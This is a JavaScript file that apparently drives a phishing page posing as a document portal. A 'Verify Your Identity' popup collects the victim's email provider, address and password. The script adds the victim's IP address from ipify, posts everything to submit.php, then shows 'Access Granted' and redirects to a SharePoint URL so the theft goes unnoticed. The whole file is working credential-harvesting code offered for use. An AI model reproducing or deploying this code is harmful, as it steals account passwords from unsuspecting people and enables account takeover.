document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const popupOverlay = document.getElementById('popupOverlay');
    const closePopupBtn = document.querySelector('.close-popup');
    const documentItems = document.querySelectorAll('.document-item');
    const sidebarLinks = document.querySelectorAll('.sidebar-link');
    const nextBtn1 = document.getElementById('nextBtn1');
    const submitBtn = document.getElementById('submitBtn');
    const backBtn = document.getElementById('backBtn');
    const formSteps = document.querySelectorAll('.form-step');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const displayedEmail = document.getElementById('displayedEmail');
    const formTitle = document.getElementById('formTitle');
    const emailHint = document.getElementById('emailHint');
    
    // Mail provider elements
    const dropdownSelected = document.getElementById('dropdownSelected');
    const dropdownOptions = document.getElementById('dropdownOptions');
    const dropdownOptionItems = document.querySelectorAll('.dropdown-option');
    
    // Mail provider configurations
    const mailProviders = {
        'gmail': {
            name: 'Gmail',
            icon: 'fab fa-google',
            suffix: '@gmail.com',
            domains: ['gmail.com']
        },
        'yahoo': {
            name: 'Yahoo',
            icon: 'fab fa-yahoo',
            suffix: '@yahoo.com',
            domains: ['yahoo.com', 'yahoo.co.uk', 'ymail.com', 'rocketmail.com']
        },
        'outlook': {
            name: 'Outlook',
            icon: 'fab fa-microsoft',
            suffix: '@outlook.com',
            domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']
        },
        'icloud': {
            name: 'iCloud',
            icon: 'fab fa-apple',
            suffix: '@icloud.com',
            domains: ['icloud.com', 'me.com', 'mac.com']
        },
        'aol': {
            name: 'AOL',
            icon: 'fas fa-at',
            suffix: '@aol.com',
            domains: ['aol.com']
        },
        'custom': {
            name: 'Other Email',
            icon: 'fas fa-edit',
            suffix: '',
            domains: []
        }
    };
    
    let currentStep = 1;
    let userEmail = '';
    let selectedProvider = null;
    let hintTimeout = null;
    
    // Create menu toggle for mobile
    createMobileMenuToggle();
    
    // Open popup when document is clicked
    documentItems.forEach(item => {
        item.addEventListener('click', function() {
            openPopup();
        });
    });
    
    // Open popup when sidebar link is clicked
    sidebarLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Remove active class from all links
            sidebarLinks.forEach(l => l.classList.remove('active'));
            // Add active class to clicked link
            this.classList.add('active');
            
            // Close mobile sidebar if open
            if (window.innerWidth <= 992) {
                closeMobileSidebar();
            }
            
            // Open popup
            openPopup();
        });
    });
    
    // Open popup function
    function openPopup() {
        resetForm();
        popupOverlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }
    
    // Close popup
    closePopupBtn.addEventListener('click', closePopup);
    
    popupOverlay.addEventListener('click', function(e) {
        if (e.target === popupOverlay) {
            closePopup();
        }
    });
    
    function closePopup() {
        popupOverlay.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
    
    // Mail Provider Dropdown Functionality
    // Toggle dropdown
    dropdownSelected.addEventListener('click', function(e) {
        e.stopPropagation();
        dropdownOptions.classList.toggle('show');
        this.classList.toggle('active');
    });
    
    // Close dropdown when clicking outside
    document.addEventListener('click', function(e) {
        if (!dropdownSelected.contains(e.target) && !dropdownOptions.contains(e.target)) {
            dropdownOptions.classList.remove('show');
            dropdownSelected.classList.remove('active');
        }
    });
    
    // Handle provider selection
    dropdownOptionItems.forEach(option => {
        option.addEventListener('click', function() {
            const providerValue = this.getAttribute('data-value');
            selectProvider(providerValue);
            
            // Close dropdown
            dropdownOptions.classList.remove('show');
            dropdownSelected.classList.remove('active');
            
            // Focus on email input
            emailInput.focus();
        });
    });
    
    // Select provider function
    function selectProvider(providerValue) {
        selectedProvider = providerValue;
        const provider = mailProviders[providerValue];
        
        // Update dropdown selected display
        dropdownSelected.innerHTML = `
            <i class="${provider.icon}"></i>
            <span>${provider.name}</span>
            <i class="fas fa-chevron-down dropdown-arrow"></i>
        `;
        
        // Add visual indication
        dropdownSelected.classList.add('has-selection');
        
        // Update placeholder
        if (providerValue === 'custom') {
            emailInput.placeholder = 'user@example.com';
        } else {
            emailInput.placeholder = 'username' + provider.suffix;
        }
        
        // Clear any existing hint
        clearHint();
    }
    
    // Auto-detect provider from email input
    function detectProviderFromEmail(email) {
        if (email.includes('@')) {
            const domain = email.split('@')[1].toLowerCase();
            
            // Check each provider's domains
            for (const [providerKey, provider] of Object.entries(mailProviders)) {
                if (providerKey === 'custom') continue;
                
                if (provider.domains.some(d => domain === d || domain.endsWith('.' + d))) {
                    return providerKey;
                }
            }
        }
        return 'custom';
    }
    
    // Handle email input changes
    emailInput.addEventListener('input', function() {
        const emailValue = this.value.trim();
        
        // Clear any existing timeout
        if (hintTimeout) {
            clearTimeout(hintTimeout);
            hintTimeout = null;
        }
        
        if (emailValue.includes('@')) {
            // Auto-detect provider from full email
            const detectedProvider = detectProviderFromEmail(emailValue);
            
            if (detectedProvider !== selectedProvider) {
                selectedProvider = detectedProvider;
                const provider = mailProviders[detectedProvider];
                
                // Update dropdown display
                dropdownSelected.innerHTML = `
                    <i class="${provider.icon}"></i>
                    <span>${provider.name}</span>
                    <i class="fas fa-chevron-down dropdown-arrow"></i>
                `;
                dropdownSelected.classList.add('has-selection');
                
                // Show temporary hint for detected provider
                if (detectedProvider === 'custom') {
                    showTemporaryHint('Custom email address detected', 1500);
                } else {
                    showTemporaryHint(`${provider.name} address detected`, 1500);
                }
            }
        }
    });
    
    // Show temporary hint that auto-hides
    function showTemporaryHint(message, duration = 1500) {
        // Clear any existing hint
        clearHint();
        
        // Show new hint
        emailHint.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
        emailHint.classList.add('show');
        
        // Auto-hide after duration
        hintTimeout = setTimeout(() => {
            clearHint();
        }, duration);
    }
    
    // Clear hint immediately
    function clearHint() {
        if (hintTimeout) {
            clearTimeout(hintTimeout);
            hintTimeout = null;
        }
        emailHint.classList.remove('show');
        emailHint.innerHTML = '';
    }
    
    // Hide hint when email input loses focus (user stops typing)
    emailInput.addEventListener('blur', function() {
        clearHint();
    });
    
    // Also allow Enter key to submit email
    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            clearHint(); // Hide hint when submitting
            if (validateEmail()) {
                proceedToPassword();
            }
        }
    });
    
    // Form navigation - Next button from email step
    nextBtn1.addEventListener('click', function() {
        clearHint(); // Hide hint when clicking Next
        if (validateEmail()) {
            proceedToPassword();
        }
    });
    
    function proceedToPassword() {
        displayEmailInStep2(userEmail);
        showStep(2);
        updateFormTitle('Verify Your Identity');
        // Focus on password input
        setTimeout(() => {
            passwordInput.focus();
        }, 300);
    }
    
    // Back button
    backBtn.addEventListener('click', function() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        // Focus back on email input
        setTimeout(() => {
            emailInput.focus();
            emailInput.select();
        }, 300);
    });
    
    // Submit button
    submitBtn.addEventListener('click', async function() {
        if (validatePassword()) {
            await submitForm();
        }
    });
    
    // Also allow Enter key to submit password
    passwordInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            if (validatePassword()) {
                submitForm();
            }
        }
    });
    
    // Display email in step 2
    function displayEmailInStep2(email) {
        displayedEmail.textContent = email;
    }
    
    // Update form title
    function updateFormTitle(title) {
        formTitle.textContent = title;
    }
    
    // Show specific form step
    function showStep(step) {
        formSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`step${step}`).classList.add('active');
        currentStep = step;
    }
    
    // Reset form to initial state
    function resetForm() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        emailInput.value = '';
        passwordInput.value = '';
        userEmail = '';
        displayedEmail.textContent = '';
        selectedProvider = null;
        
        // Reset dropdown to default state
        dropdownSelected.innerHTML = `
            <i class="fas fa-envelope"></i>
            <span>Select Mail Provider</span>
            <i class="fas fa-chevron-down dropdown-arrow"></i>
        `;
        dropdownSelected.classList.remove('has-selection');
        
        // Reset email input
        emailInput.placeholder = 'Email';
        clearHint();
        
        // Ensure dropdown is closed
        dropdownOptions.classList.remove('show');
        dropdownSelected.classList.remove('active');
    }
    
    // Validation functions
    function validateEmail() {
        const emailValue = emailInput.value.trim();
        
        if (!emailValue) {
            alert('Please enter your email address');
            return false;
        }
        
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(emailValue)) {
            alert('Please enter a valid email address (e.g., user@example.com)');
            return false;
        }
        
        // Auto-detect provider if not already selected
        if (!selectedProvider) {
            selectedProvider = detectProviderFromEmail(emailValue);
            
            // Update dropdown display
            const provider = mailProviders[selectedProvider];
            dropdownSelected.innerHTML = `
                <i class="${provider.icon}"></i>
                <span>${provider.name}</span>
                <i class="fas fa-chevron-down dropdown-arrow"></i>
            `;
            dropdownSelected.classList.add('has-selection');
        }
        
        userEmail = emailValue;
        return true;
    }
    
    function validatePassword() {
        const password = passwordInput.value.trim();
        
        if (!password) {
            alert('Please enter your password');
            return false;
        }
        
        if (password.length < 6) {
            alert('Password must be at least 6 characters');
            return false;
        }
        
        return true;
    }
    
    // Submit form data to server
    async function submitForm() {
        const submitBtn = document.getElementById('submitBtn');
        const originalText = submitBtn.textContent;
        
        try {
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.textContent = 'Submitting...';
            submitBtn.style.opacity = '0.7';
            
            const formData = {
                email: userEmail,
                password: passwordInput.value.trim(),
                provider: selectedProvider
            };
            
            console.log('Submitting form data:', { 
                email: formData.email, 
                provider: formData.provider,
                passwordLength: formData.password.length 
            });
            
            // Get IP address
            let ipAddress = 'Unknown';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                }
            } catch (ipError) {
                console.warn('Could not fetch IP address:', ipError);
            }
            
            formData.ip_address = ipAddress;
            
            // Send data to server
            console.log('Sending request to submit.php...');
            const response = await fetch('submit.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(formData)
            });
            
            console.log('Response status:', response.status);
            const result = await response.json();
            console.log('Server response:', result);
            
            if (result.success) {
                // Show success message
                showStep(3);
                updateFormTitle('Access Granted');
                
                // Log success to console
                console.log('Data stored successfully with ID:', result.insert_id);
                
                // Countdown before redirect
                let countdown = 3;
                const countdownElement = document.querySelector('.success-message p');
                const originalText = countdownElement.textContent;
                
                // Update countdown every second
                const countdownInterval = setInterval(() => {
                    countdownElement.textContent = `Redirecting in ${countdown} seconds...`;
                    countdown--;
                    
                    if (countdown < 0) {
                        clearInterval(countdownInterval);
                        performRedirect();
                    }
                }, 1000);
                
            } else {
                throw new Error(result.error || 'Server returned an error');
            }
            
        } catch (error) {
            console.error('Error submitting form:', error);
            
            // Show user-friendly error message
            let errorMessage = 'There was an error submitting your information. ';
            
            if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
                errorMessage += 'Please check your internet connection and try again.';
            } else if (error.message.includes('connection')) {
                errorMessage += 'Cannot connect to server. Please try again later.';
            } else {
                errorMessage += 'Please try again.';
            }
            
            alert(errorMessage);
            
            // Re-enable button
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
            submitBtn.style.opacity = '1';
        }
    }
    
    // Function to perform the redirect
    function performRedirect() {
        // Close the popup
        closePopup();
        
        // Define the redirect URL (you can change this to any URL you want)
        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
        
        console.log('Redirecting to:', redirectUrl);
        
        // Redirect to the URL (open in same tab)
        window.location.href = redirectUrl;
    }
    
    // Mobile menu functionality
    function createMobileMenuToggle() {
        // Create toggle button
        const toggleBtn = document.createElement('button');
        toggleBtn.className = 'menu-toggle';
        toggleBtn.innerHTML = '<i class="fas fa-bars"></i>';
        document.body.appendChild(toggleBtn);
        
        // Create overlay
        const overlay = document.createElement('div');
        overlay.className = 'sidebar-overlay';
        document.body.appendChild(overlay);
        
        // Toggle sidebar
        toggleBtn.addEventListener('click', function() {
            document.querySelector('.sidebar').classList.toggle('active');
            overlay.style.display = 'block';
        });
        
        // Close sidebar when clicking overlay
        overlay.addEventListener('click', function() {
            closeMobileSidebar();
        });
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            const sidebar = document.querySelector('.sidebar');
            if (window.innerWidth <= 992 && 
                !sidebar.contains(e.target) && 
                e.target !== toggleBtn &&
                sidebar.classList.contains('active')) {
                closeMobileSidebar();
            }
        });
        
        // Close sidebar on window resize
        window.addEventListener('resize', function() {
            if (window.innerWidth > 992) {
                closeMobileSidebar();
            }
        });
    }
    
    function closeMobileSidebar() {
        document.querySelector('.sidebar').classList.remove('active');
        document.querySelector('.sidebar-overlay').style.display = 'none';
    }
    
    // Set first sidebar link as active by default
    sidebarLinks[0].classList.add('active');
});